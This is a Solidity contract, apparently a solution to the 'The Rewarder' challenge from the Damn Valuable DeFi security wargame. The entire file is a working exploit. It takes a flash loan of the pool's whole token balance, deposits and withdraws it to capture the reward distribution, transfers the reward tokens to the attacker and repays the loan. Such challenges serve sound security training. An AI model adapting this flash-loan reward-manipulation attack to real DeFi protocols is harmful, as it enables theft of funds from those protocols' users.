// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract MaliciousContractReward {

    address public attacker;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable flashLoanerPool;
    RewardToken public immutable rewardToken;

    constructor(address _target_flashloan, address _target_rewards, address _liquidityToken, address _rewardToken) {
        flashLoanerPool = FlashLoanerPool(_target_flashloan);
        rewarderPool = TheRewarderPool(_target_rewards);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        attacker = msg.sender;
    }

    function attack() external {
        // Get a flash-loan
        uint256 flashLoanerBalance = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(flashLoanerBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve the rewarder pool to expense liquidityToken
        liquidityToken.approve(address(rewarderPool), amount);

        // Deposit the flashloan amount, the same function will call the distributeRewards()
        rewarderPool.deposit(amount);

        // Withdraw so the flashloan can get back
        rewarderPool.withdraw(amount);

        // Transfer the rewards to the attacker
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, rewardBalance);

        // Return the flash-loan
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}